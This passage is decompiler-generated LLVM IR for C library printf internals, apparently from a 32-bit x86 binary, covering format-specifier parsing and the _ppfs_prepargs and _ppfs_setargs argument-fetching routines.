  br i1 %v1_8050b9126, label %dec_label_pc_8050b6b, label %dec_label_pc_8050b93

dec_label_pc_8050b6b:                             ; preds = %dec_label_pc_8050b62, %dec_label_pc_8050b8d.backedge
  %v6_8050b8d29 = phi i32 [ %v6_8050b8d, %dec_label_pc_8050b8d.backedge ], [ %v6_8050b8d24, %dec_label_pc_8050b62 ]
  %v2_8050b8d28 = phi i8 [ %v2_8050b8d, %dec_label_pc_8050b8d.backedge ], [ %v2_8050b8d21, %dec_label_pc_8050b62 ]
  %v0_8050b7027 = phi i32 [ %v0_8050b70.be, %dec_label_pc_8050b8d.backedge ], [ %v0_8050b62, %dec_label_pc_8050b62 ]
  %v10_8050b6b = icmp eq i8 %v2_8050b8d28, 37
  %v1_8050b6e = icmp eq i1 %v10_8050b6b, false
  br i1 %v1_8050b6e, label %dec_label_pc_8050b8c, label %dec_label_pc_8050b70

dec_label_pc_8050b70:                             ; preds = %dec_label_pc_8050b6b
  %v1_8050b70 = add i32 %v0_8050b7027, 1
  store i32 %v1_8050b70, i32* %eax.global-to-local, align 4
  %v1_8050b71 = inttoptr i32 %v1_8050b70 to i8*
  %v2_8050b71 = load i8, i8* %v1_8050b71, align 1
  %v11_8050b71 = icmp eq i8 %v2_8050b71, 37
  br i1 %v11_8050b71, label %dec_label_pc_8050b8c, label %dec_label_pc_8050b76

dec_label_pc_8050b76:                             ; preds = %dec_label_pc_8050b70
  %v1_8050b79 = load i32, i32* @ebx, align 4
  %v2_8050b79 = inttoptr i32 %v1_8050b79 to i32*
  store i32 %v1_8050b70, i32* %v2_8050b79, align 4
  %v0_8050b7b = load i32, i32* @ebx, align 4
  %v1_8050b7c = inttoptr i32 %v0_8050b7b to i32*
  %v2_8050b7c = call i32 @_ppfs_parsespec(i32* %v1_8050b7c)
  store i32 %v2_8050b7c, i32* %eax.global-to-local, align 4
  %v2_8050b84 = icmp slt i32 %v2_8050b7c, 0
  br i1 %v2_8050b84, label %dec_label_pc_8050b97, label %dec_label_pc_8050b88

dec_label_pc_8050b88:                             ; preds = %dec_label_pc_8050b76
  %v0_8050b88 = load i32, i32* @ebx, align 4
  %v1_8050b88 = inttoptr i32 %v0_8050b88 to i32*
  %v2_8050b88 = load i32, i32* %v1_8050b88, align 4
  %v4_8050b8d.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050b8d.backedge

dec_label_pc_8050b8c:                             ; preds = %dec_label_pc_8050b70, %dec_label_pc_8050b6b
  %v0_8050b8c = phi i32 [ %v1_8050b70, %dec_label_pc_8050b70 ], [ %v0_8050b7027, %dec_label_pc_8050b6b ]
  %v1_8050b8c = add i32 %v0_8050b8c, 1
  br label %dec_label_pc_8050b8d.backedge

dec_label_pc_8050b8d.backedge:                    ; preds = %dec_label_pc_8050b8c, %dec_label_pc_8050b88
  %v4_8050b8d.be = phi i32 [ %v4_8050b8d.pre.pre, %dec_label_pc_8050b88 ], [ %v6_8050b8d29, %dec_label_pc_8050b8c ]
  %v0_8050b70.be = phi i32 [ %v2_8050b88, %dec_label_pc_8050b88 ], [ %v1_8050b8c, %dec_label_pc_8050b8c ]
  store i32 %v0_8050b70.be, i32* %eax.global-to-local, align 4
  %v1_8050b8d = inttoptr i32 %v0_8050b70.be to i8*
  %v2_8050b8d = load i8, i8* %v1_8050b8d, align 1
  %v3_8050b8d = zext i8 %v2_8050b8d to i32
  %v5_8050b8d = and i32 %v4_8050b8d.be, -256
  %v6_8050b8d = or i32 %v3_8050b8d, %v5_8050b8d
  store i32 %v6_8050b8d, i32* %edx.global-to-local, align 4
  %v4_8050b8f = icmp eq i8 %v2_8050b8d, 0
  %v1_8050b91 = icmp eq i1 %v4_8050b8f, false
  br i1 %v1_8050b91, label %dec_label_pc_8050b6b, label %dec_label_pc_8050b8d.dec_label_pc_8050b93_crit_edge

dec_label_pc_8050b8d.dec_label_pc_8050b93_crit_edge: ; preds = %dec_label_pc_8050b8d.backedge
  %v0_8050b93.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050b93

dec_label_pc_8050b93:                             ; preds = %dec_label_pc_8050b8d.dec_label_pc_8050b93_crit_edge, %dec_label_pc_8050b62
  %v0_8050b93 = phi i32 [ %v0_8050b93.pre, %dec_label_pc_8050b8d.dec_label_pc_8050b93_crit_edge ], [ %v0_8050b62, %dec_label_pc_8050b62 ]
  %v1_8050b93 = load i32, i32* @ebx, align 4
  %v2_8050b93 = inttoptr i32 %v1_8050b93 to i32*
  store i32 %v0_8050b93, i32* %v2_8050b93, align 4
  br label %dec_label_pc_8050b97

dec_label_pc_8050b97:                             ; preds = %dec_label_pc_8050b76, %dec_label_pc_8050b93
  %storemerge = phi i32 [ 0, %dec_label_pc_8050b93 ], [ -1, %dec_label_pc_8050b76 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_8050b97 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050b97, i32* @edx, align 4
  %v2_8050b98 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050b98, i32* @ebx, align 4
  store i32 %v0_8050b2c, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_8050b8d, { 1, 0 }
  uselistorder i8 %v2_8050b8d, { 1, 2, 0 }
  uselistorder i32 %v0_8050b70.be, { 2, 1, 0 }
  uselistorder i32 %v0_8050b7027, { 1, 0 }
  uselistorder i32 %v0_8050b62, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8050b5f, { 0, 2, 1 }
  uselistorder i32 %v1_8050b5c, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder i32 (i32*)* @_ppfs_parsespec, { 1, 0 }
  uselistorder label %dec_label_pc_8050b97, { 1, 0 }
  uselistorder label %dec_label_pc_8050b6b, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8050b9c = load i32, i32* @esi, align 4
  %v0_8050b9d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8050ba9 = add i32 %arg1, 24
  %v2_8050ba9 = inttoptr i32 %v1_8050ba9 to i32*
  %v3_8050ba9 = load i32, i32* %v2_8050ba9, align 4
  %v2_8050bac = add i32 %arg1, 76
  %v3_8050bac = inttoptr i32 %v2_8050bac to i32*
  store i32 %arg2, i32* %v3_8050bac, align 4
  %tmp8 = icmp slt i32 %v3_8050ba9, 1
  br i1 %tmp8, label %dec_label_pc_8050bda, label %dec_label_pc_8050bb3

dec_label_pc_8050bb3:                             ; preds = %entry
  %v1_8050bb6 = load i32, i32* @ebx, align 4
  %v2_8050bb6 = add i32 %v1_8050bb6, 28
  %v3_8050bb6 = inttoptr i32 %v2_8050bb6 to i32*
  store i32 %v3_8050ba9, i32* %v3_8050bb6, align 4
  %v0_8050bb9 = load i32, i32* @ebx, align 4
  %v1_8050bb9 = add i32 %v0_8050bb9, 24
  %v2_8050bb9 = inttoptr i32 %v1_8050bb9 to i32*
  store i32 0, i32* %v2_8050bb9, align 4
  %v0_8050bc0 = load i32, i32* @ebx, align 4
  %v1_8050bc0 = add i32 %v0_8050bc0, 4
  %v2_8050bc0 = inttoptr i32 %v1_8050bc0 to i32*
  store i32 0, i32* %v2_8050bc0, align 4
  %v0_8050bc7 = load i32, i32* @ebx, align 4
  %v1_8050bc7 = add i32 %v0_8050bc7, 8
  %v2_8050bc7 = inttoptr i32 %v1_8050bc7 to i32*
  store i32 0, i32* %v2_8050bc7, align 4
  %v0_8050bce = load i32, i32* @ebx, align 4
  %v1_8050bcf = call i32 @_ppfs_setargs(i32 %v0_8050bce)
  %v1_8050bd4 = load i32, i32* @ebx, align 4
  %v2_8050bd4 = add i32 %v1_8050bd4, 24
  %v3_8050bd4 = inttoptr i32 %v2_8050bd4 to i32*
  store i32 %v3_8050ba9, i32* %v3_8050bd4, align 4
  br label %dec_label_pc_8050bda

dec_label_pc_8050bda:                             ; preds = %entry, %dec_label_pc_8050bb3
  %v2_8050bda = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8050b9d, i32* @ebx, align 4
  store i32 %v0_8050b9c, i32* @esi, align 4
  ret i32 %v2_8050bda

; uselistorder directives
  uselistorder i32 %v3_8050ba9, { 1, 2, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050bda, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050be1 = load i32, i32* @ebx, align 4
  store i32 %v0_8050be1, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_8050be6 = add i32 %arg1, 80
  store i32 %v1_8050be6, i32* %ebx.global-to-local, align 4
  %v1_8050be9 = add i32 %arg1, 24
  %v2_8050be9 = inttoptr i32 %v1_8050be9 to i32*
  %v3_8050be9 = load i32, i32* %v2_8050be9, align 4
  %v4_8050be9 = icmp eq i32 %v3_8050be9, 0
  %v1_8050bed = icmp eq i1 %v4_8050be9, false
  %v1_8050ca3 = add i32 %arg1, 8
  %v2_8050ca3 = inttoptr i32 %v1_8050ca3 to i32*
  %v3_8050ca3 = load i32, i32* %v2_8050ca3, align 4
  %v8_8050ca3 = icmp eq i32 %v3_8050ca3, -2147483648
  %v1_8050caa = icmp eq i1 %v8_8050ca3, false
  br i1 %v1_8050bed, label %dec_label_pc_8050ca3, label %dec_label_pc_8050bf3

dec_label_pc_8050bf3:                             ; preds = %entry
  br i1 %v1_8050caa, label %dec_label_pc_8050c0d, label %dec_label_pc_8050bfc

dec_label_pc_8050bfc:                             ; preds = %dec_label_pc_8050bf3
  %v1_8050bfc = add i32 %arg1, 76
  %v2_8050bfc = inttoptr i32 %v1_8050bfc to i32*
  %v3_8050bfc = load i32, i32* %v2_8050bfc, align 4
  store i32 %v3_8050bfc, i32* %eax.global-to-local, align 4
  %v1_8050bff = add i32 %v3_8050bfc, 4
  store i32 %v1_8050bff, i32* %edx.global-to-local, align 4
  store i32 %v1_8050bff, i32* %v2_8050bfc, align 4
  %v0_8050c05 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c05 = inttoptr i32 %v0_8050c05 to i32*
  %v2_8050c05 = load i32, i32* %v1_8050c05, align 4
  store i32 %v2_8050c05, i32* %eax.global-to-local, align 4
  %v1_8050c07 = load i32, i32* @ecx, align 4
  %v2_8050c07 = add i32 %v1_8050c07, 80
  %v3_8050c07 = inttoptr i32 %v2_8050c07 to i32*
  store i32 %v2_8050c05, i32* %v3_8050c07, align 4
  %v0_8050c0a = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c0a = load i32, i32* @ecx, align 4
  %v2_8050c0a = add i32 %v1_8050c0a, 8
  %v3_8050c0a = inttoptr i32 %v2_8050c0a to i32*
  store i32 %v0_8050c0a, i32* %v3_8050c0a, align 4
  %v0_8050c0d.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050c0d

dec_label_pc_8050c0d:                             ; preds = %dec_label_pc_8050bf3, %dec_label_pc_8050bfc
  %v1_8050c1c = phi i32 [ %arg1, %dec_label_pc_8050bf3 ], [ %v0_8050c0d.pre, %dec_label_pc_8050bfc ]
  %v1_8050c0d = add i32 %v1_8050c1c, 4
  %v2_8050c0d = inttoptr i32 %v1_8050c0d to i32*
  %v3_8050c0d = load i32, i32* %v2_8050c0d, align 4
  %v8_8050c0d = icmp eq i32 %v3_8050c0d, -2147483648
  %v1_8050c14 = icmp eq i1 %v8_8050c0d, false
  br i1 %v1_8050c14, label %dec_label_pc_8050c27, label %dec_label_pc_8050c16

dec_label_pc_8050c16:                             ; preds = %dec_label_pc_8050c0d
  %v1_8050c16 = add i32 %v1_8050c1c, 76
  %v2_8050c16 = inttoptr i32 %v1_8050c16 to i32*
  %v3_8050c16 = load i32, i32* %v2_8050c16, align 4
  store i32 %v3_8050c16, i32* %eax.global-to-local, align 4
  %v1_8050c19 = add i32 %v3_8050c16, 4
  store i32 %v1_8050c19, i32* %edx.global-to-local, align 4
  store i32 %v1_8050c19, i32* %v2_8050c16, align 4
  %v0_8050c1f = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c1f = inttoptr i32 %v0_8050c1f to i32*
  %v2_8050c1f = load i32, i32* %v1_8050c1f, align 4
  store i32 %v2_8050c1f, i32* %eax.global-to-local, align 4
  %v1_8050c21 = load i32, i32* @ecx, align 4
  %v2_8050c21 = add i32 %v1_8050c21, 80
  %v3_8050c21 = inttoptr i32 %v2_8050c21 to i32*
  store i32 %v2_8050c1f, i32* %v3_8050c21, align 4
  %v0_8050c24 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c24 = load i32, i32* @ecx, align 4
  %v2_8050c24 = add i32 %v1_8050c24, 4
  %v3_8050c24 = inttoptr i32 %v2_8050c24 to i32*
  store i32 %v0_8050c24, i32* %v3_8050c24, align 4
  %v1_8050c9c17.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050c27

dec_label_pc_8050c27:                             ; preds = %dec_label_pc_8050c0d, %dec_label_pc_8050c16
  %v1_8050c9c17 = phi i32 [ %v1_8050c1c, %dec_label_pc_8050c0d ], [ %v1_8050c9c17.pre, %dec_label_pc_8050c16 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_8050c9c18 = add i32 %v1_8050c9c17, 28
  %v3_8050c9c19 = inttoptr i32 %v2_8050c9c18 to i32*
  %v4_8050c9c20 = load i32, i32* %v3_8050c9c19, align 4
  %v5_8050c9f21 = icmp sgt i32 %v4_8050c9c20, 0
  br i1 %v5_8050c9f21, label %dec_label_pc_8050c2b, label %dec_label_pc_8050cd1.loopexit

dec_label_pc_8050c2b:                             ; preds = %dec_label_pc_8050c27, %dec_label_pc_8050c9b
  %v1_8050c9c23 = phi i32 [ %v1_8050c9c, %dec_label_pc_8050c9b ], [ %v1_8050c9c17, %dec_label_pc_8050c27 ]
  %v1_8050c2b22 = phi i32 [ %v1_8050c9b, %dec_label_pc_8050c9b ], [ 0, %dec_label_pc_8050c27 ]
  %v2_8050c2b = mul i32 %v1_8050c2b22, 4
  %v3_8050c2b = add i32 %v2_8050c2b, 40
  %v4_8050c2b = add i32 %v3_8050c2b, %v1_8050c9c23
  %v5_8050c2b = inttoptr i32 %v4_8050c2b to i32*
  %v6_8050c2b = load i32, i32* %v5_8050c2b, align 4
  store i32 %v6_8050c2b, i32* %eax.global-to-local, align 4
  %v1_8050c2f = add i32 %v6_8050c2b, -8
  %v9_8050c2f = icmp eq i32 %v1_8050c2f, 0
  br i1 %v9_8050c2f, label %dec_label_pc_8050c9b, label %dec_label_pc_8050c34

dec_label_pc_8050c34:                             ; preds = %dec_label_pc_8050c2b
  %v10_8050c2f = icmp slt i32 %v1_8050c2f, 0
  %v6_8050c2f = sub i32 7, %v6_8050c2b
  %v7_8050c2f = and i32 %v6_8050c2f, %v6_8050c2b
  %v8_8050c2f = icmp slt i32 %v7_8050c2f, 0
  %v1_8050c34 = add i32 %v1_8050c9c23, 76
  %v2_8050c34 = inttoptr i32 %v1_8050c34 to i32*
  %v3_8050c34 = load i32, i32* %v2_8050c34, align 4
  store i32 %v3_8050c34, i32* %edx.global-to-local, align 4
  %v3_8050c37 = icmp eq i1 %v10_8050c2f, %v8_8050c2f
  br i1 %v3_8050c37, label %dec_label_pc_8050c47, label %dec_label_pc_8050c39

dec_label_pc_8050c39:                             ; preds = %dec_label_pc_8050c34
  %tmp15 = icmp slt i32 %v6_8050c2b, 3
  %v9_8050c40 = icmp eq i32 %v6_8050c2b, 7
  %v1_8050c43 = icmp eq i1 %v9_8050c40, false
  %or.cond = or i1 %tmp15, %v1_8050c43
  br i1 %or.cond, label %dec_label_pc_8050c8e, label %dec_label_pc_8050c70

dec_label_pc_8050c47:                             ; preds = %dec_label_pc_8050c34
  %tmp16 = icmp sgt i32 %v6_8050c2b, 1024
  br i1 %tmp16, label %dec_label_pc_8050c50, label %dec_label_pc_8050c8e

dec_label_pc_8050c50:                             ; preds = %dec_label_pc_8050c47
  %v6_8050c50 = icmp eq i32 %v6_8050c2b, 2048
  br i1 %v6_8050c50, label %dec_label_pc_8050c60, label %dec_label_pc_8050c57

dec_label_pc_8050c57:                             ; preds = %dec_label_pc_8050c50
  %v9_8050c57 = icmp eq i32 %v6_8050c2b, 2055
  %v1_8050c5c = icmp eq i1 %v9_8050c57, false
  br i1 %v1_8050c5c, label %dec_label_pc_8050c8e, label %dec_label_pc_8050c7f

dec_label_pc_8050c60:                             ; preds = %dec_label_pc_8050c50
  %v1_8050c60 = add i32 %v3_8050c34, 8
  store i32 %v1_8050c60, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c60, i32* %v2_8050c34, align 4
  %v0_8050c66 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050c66 = inttoptr i32 %v0_8050c66 to i32*
  %v2_8050c66 = load i32, i32* %v1_8050c66, align 4
  store i32 %v2_8050c66, i32* %eax.global-to-local, align 4
  %v1_8050c68 = add i32 %v0_8050c66, 4
  %v2_8050c68 = inttoptr i32 %v1_8050c68 to i32*
  %v3_8050c68 = load i32, i32* %v2_8050c68, align 4
  store i32 %v3_8050c68, i32* %edx.global-to-local, align 4
  %v1_8050c6b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050c6b = add i32 %v1_8050c6b, 4
  %v3_8050c6b = inttoptr i32 %v2_8050c6b to i32*
  store i32 %v3_8050c68, i32* %v3_8050c6b, align 4
  %v0_8050c96.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c96

dec_label_pc_8050c70:                             ; preds = %dec_label_pc_8050c39
  %v3_8050c70 = load i32, i32* %v2_8050c34, align 4
  store i32 %v3_8050c70, i32* %edx.global-to-local, align 4
  %v1_8050c73 = add i32 %v3_8050c70, 8
  store i32 %v1_8050c73, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c73, i32* %v2_8050c34, align 4
  %v0_8050c79 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050c79 = inttoptr i32 %v0_8050c79 to double*
  %v2_8050c79 = load double, double* %v1_8050c79, align 4
  %v2_8050c7b = load i32, i32* %ebx.global-to-local, align 4
  %v4_8050c7b = inttoptr i32 %v2_8050c7b to double*
  store double %v2_8050c79, double* %v4_8050c7b, align 4
  br label %dec_label_pc_8050c98

dec_label_pc_8050c7f:                             ; preds = %dec_label_pc_8050c57
  %v3_8050c7f = load i32, i32* %v2_8050c34, align 4
  store i32 %v3_8050c7f, i32* %edx.global-to-local, align 4
  %v1_8050c82 = add i32 %v3_8050c7f, 12
  store i32 %v1_8050c82, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c82, i32* %v2_8050c34, align 4
  %v0_8050c88 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050c88 = inttoptr i32 %v0_8050c88 to x86_fp80*
  %v2_8050c88 = load x86_fp80, x86_fp80* %v1_8050c88, align 4
  %v2_8050c8a = load i32, i32* %ebx.global-to-local, align 4
  %v3_8050c8a = inttoptr i32 %v2_8050c8a to x86_fp80*
  store x86_fp80 %v2_8050c88, x86_fp80* %v3_8050c8a, align 4
  br label %dec_label_pc_8050c98

dec_label_pc_8050c8e:                             ; preds = %dec_label_pc_8050c39, %dec_label_pc_8050c47, %dec_label_pc_8050c57
  %v1_8050c8e = add i32 %v3_8050c34, 4
  store i32 %v1_8050c8e, i32* %eax.global-to-local, align 4
  store i32 %v1_8050c8e, i32* %v2_8050c34, align 4
  %v0_8050c94 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050c94 = inttoptr i32 %v0_8050c94 to i32*
  %v2_8050c94 = load i32, i32* %v1_8050c94, align 4
  store i32 %v2_8050c94, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c96

dec_label_pc_8050c96:                             ; preds = %dec_label_pc_8050c60, %dec_label_pc_8050c8e
  %v0_8050c96 = phi i32 [ %v0_8050c96.pre, %dec_label_pc_8050c60 ], [ %v2_8050c94, %dec_label_pc_8050c8e ]
  %v1_8050c96 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050c96 = inttoptr i32 %v1_8050c96 to i32*
  store i32 %v0_8050c96, i32* %v2_8050c96, align 4
  %v0_8050c98.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050c98

dec_label_pc_8050c98:                             ; preds = %dec_label_pc_8050c7f, %dec_label_pc_8050c70, %dec_label_pc_8050c96
  %v0_8050c98 = phi i32 [ %v2_8050c8a, %dec_label_pc_8050c7f ], [ %v2_8050c7b, %dec_label_pc_8050c70 ], [ %v0_8050c98.pre, %dec_label_pc_8050c96 ]
  %v1_8050c98 = add i32 %v0_8050c98, 12
  store i32 %v1_8050c98, i32* %ebx.global-to-local, align 4
  %v0_8050c9b.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8050c9c.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050c9b

dec_label_pc_8050c9b:                             ; preds = %dec_label_pc_8050c2b, %dec_label_pc_8050c98
  %v1_8050c9c = phi i32 [ %v1_8050c9c23, %dec_label_pc_8050c2b ], [ %v1_8050c9c.pre, %dec_label_pc_8050c98 ]
  %v0_8050c9b = phi i32 [ %v1_8050c2b22, %dec_label_pc_8050c2b ], [ %v0_8050c9b.pre, %dec_label_pc_8050c98 ]
  %v1_8050c9b = add i32 %v0_8050c9b, 1
  store i32 %v1_8050c9b, i32* %esi.global-to-local, align 4
  %v2_8050c9c = add i32 %v1_8050c9c, 28
  %v3_8050c9c = inttoptr i32 %v2_8050c9c to i32*
  %v4_8050c9c = load i32, i32* %v3_8050c9c, align 4
  %v5_8050c9f = icmp slt i32 %v1_8050c9b, %v4_8050c9c
  br i1 %v5_8050c9f, label %dec_label_pc_8050c2b, label %dec_label_pc_8050cd1.loopexit

dec_label_pc_8050ca3:                             ; preds = %entry
  br i1 %v1_8050caa, label %dec_label_pc_8050cba, label %dec_label_pc_8050cac

dec_label_pc_8050cac:                             ; preds = %dec_label_pc_8050ca3
  %v1_8050cac = add i32 %arg1, 36
  %v2_8050cac = inttoptr i32 %v1_8050cac to i8*
  %v3_8050cac = load i8, i8* %v2_8050cac, align 1
  %v2_8050cb0 = zext i8 %v3_8050cac to i32
  %v3_8050cb0 = mul nuw nsw i32 %v2_8050cb0, 12
  store i32 %v3_8050cb0, i32* %eax.global-to-local, align 4
  %v2_8050cb3 = add i32 %arg1, 68
  %v3_8050cb3 = add i32 %v2_8050cb3, %v3_8050cb0
  %v4_8050cb3 = inttoptr i32 %v3_8050cb3 to i32*
  %v5_8050cb3 = load i32, i32* %v4_8050cb3, align 4
  store i32 %v5_8050cb3, i32* %eax.global-to-local, align 4
  store i32 %v5_8050cb3, i32* %v2_8050ca3, align 4
  %v0_8050cba.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050cba

dec_label_pc_8050cba:                             ; preds = %dec_label_pc_8050ca3, %dec_label_pc_8050cac
  %v1_8050cce = phi i32 [ %arg1, %dec_label_pc_8050ca3 ], [ %v0_8050cba.pre, %dec_label_pc_8050cac ]
  %v1_8050cba = add i32 %v1_8050cce, 4
  %v2_8050cba = inttoptr i32 %v1_8050cba to i32*
  %v3_8050cba = load i32, i32* %v2_8050cba, align 4
  %v8_8050cba = icmp eq i32 %v3_8050cba, -2147483648
  %v1_8050cc1 = icmp eq i1 %v8_8050cba, false
  br i1 %v1_8050cc1, label %dec_label_pc_8050cd1, label %dec_label_pc_8050cc3

dec_label_pc_8050cc3:                             ; preds = %dec_label_pc_8050cba
  %v1_8050cc3 = add i32 %v1_8050cce, 37
  %v2_8050cc3 = inttoptr i32 %v1_8050cc3 to i8*
  %v3_8050cc3 = load i8, i8* %v2_8050cc3, align 1
  %v2_8050cc7 = zext i8 %v3_8050cc3 to i32
  %v3_8050cc7 = mul nuw nsw i32 %v2_8050cc7, 12
  store i32 %v3_8050cc7, i32* %eax.global-to-local, align 4
  %v1_8050cca = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050cca = add nsw i32 %v3_8050cc7, -12
  %v3_8050cca = add i32 %v2_8050cca, %v1_8050cca
  %v4_8050cca = inttoptr i32 %v3_8050cca to i32*
  %v5_8050cca = load i32, i32* %v4_8050cca, align 4
  store i32 %v5_8050cca, i32* %eax.global-to-local, align 4
  store i32 %v5_8050cca, i32* %v2_8050cba, align 4
  %v0_8050cd1.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8050cd1

dec_label_pc_8050cd1.loopexit:                    ; preds = %dec_label_pc_8050c9b, %dec_label_pc_8050c27
  %v1_8050c9c.lcssa = phi i32 [ %v1_8050c9c17, %dec_label_pc_8050c27 ], [ %v1_8050c9c, %dec_label_pc_8050c9b ]
  br label %dec_label_pc_8050cd1

dec_label_pc_8050cd1:                             ; preds = %dec_label_pc_8050cd1.loopexit, %dec_label_pc_8050cba, %dec_label_pc_8050cc3
  %v10_8050cd8 = phi i32 [ %v1_8050c9c.lcssa, %dec_label_pc_8050cd1.loopexit ], [ %v1_8050cce, %dec_label_pc_8050cba ], [ %v0_8050cd1.pre, %dec_label_pc_8050cc3 ]
  %v1_8050cd1 = add i32 %v10_8050cd8, 8
  %v2_8050cd1 = inttoptr i32 %v1_8050cd1 to i32*
  %v3_8050cd1 = load i32, i32* %v2_8050cd1, align 4
  store i32 %v3_8050cd1, i32* %eax.global-to-local, align 4
  %v2_8050cd4 = icmp slt i32 %v3_8050cd1, 0
  %v1_8050cd6 = icmp eq i1 %v2_8050cd4, false
  br i1 %v1_8050cd6, label %dec_label_pc_8050cec, label %dec_label_pc_8050cd8

dec_label_pc_8050cd8:                             ; preds = %dec_label_pc_8050cd1
  %v1_8050cd8 = add i32 %v10_8050cd8, 16
  %v2_8050cd8 = inttoptr i32 %v1_8050cd8 to i32*
  %v3_8050cd8 = load i32, i32* %v2_8050cd8, align 4
  %v4_8050cd8 = or i32 %v3_8050cd8, 8
  store i32 %v4_8050cd8, i32* %v2_8050cd8, align 4
  %v0_8050cdc = load i32, i32* @ecx, align 4
  %v1_8050cdc = add i32 %v0_8050cdc, 16
  %v2_8050cdc = inttoptr i32 %v1_8050cdc to i32*
  %v3_8050cdc = load i32, i32* %v2_8050cdc, align 4
  %v4_8050cdc = and i32 %v3_8050cdc, -2
  store i32 %v4_8050cdc, i32* %v2_8050cdc, align 4
  %v0_8050ce0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ce0 = sub i32 0, %v0_8050ce0
  store i32 %v1_8050ce0, i32* %eax.global-to-local, align 4
  %v1_8050ce2 = load i32, i32* @ecx, align 4
  %v2_8050ce2 = add i32 %v1_8050ce2, 8
  %v3_8050ce2 = inttoptr i32 %v2_8050ce2 to i32*
  store i32 %v1_8050ce0, i32* %v3_8050ce2, align 4
  %v0_8050ce5 = load i32, i32* @ecx, align 4
  %v1_8050ce5 = add i32 %v0_8050ce5, 20
  %v2_8050ce5 = inttoptr i32 %v1_8050ce5 to i32*
  store i32 32, i32* %v2_8050ce5, align 4
  %v0_8050cee.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050cec

dec_label_pc_8050cec:                             ; preds = %dec_label_pc_8050cd1, %dec_label_pc_8050cd8
  %v0_8050cee = phi i32 [ %v3_8050cd1, %dec_label_pc_8050cd1 ], [ %v0_8050cee.pre, %dec_label_pc_8050cd8 ]
  %v2_8050cec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050cec, i32* @ebx, align 4
  ret i32 %v0_8050cee

; uselistorder directives
  uselistorder i32 %v3_8050cc7, { 1, 0 }
  uselistorder i32 %v3_8050cb0, { 1, 0 }
  uselistorder i32 %v1_8050c9b, { 2, 1, 0 }
  uselistorder i32 %v1_8050c9c, { 0, 2, 1 }
  uselistorder i32 %v3_8050c34, { 1, 0, 2 }
  uselistorder i32* %v2_8050c34, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_8050c2f, { 1, 0 }
  uselistorder i32 %v6_8050c2b, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_8050c2b22, { 1, 0 }
  uselistorder i1 %v1_8050caa, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_8050cec, { 1, 0 }
  uselistorder label %dec_label_pc_8050cd1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050cba, { 1, 0 }
  uselistorder label %dec_label_pc_8050c9b, { 1, 0 }
  uselistorder label %dec_label_pc_8050c98, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050c96, { 1, 0 }
  uselistorder label %dec_label_pc_8050c8e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8050c2b, { 1, 0 }
  uselistorder label %dec_label_pc_8050c27, { 1, 0 }
  uselistorder label %dec_label_pc_8050c0d, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8050cf0 = load i32, i32* @eax, align 4
  br label %dec_label_pc_8050cf7

dec_label_pc_8050cf7:                             ; preds = %dec_label_pc_8050cf7, %entry
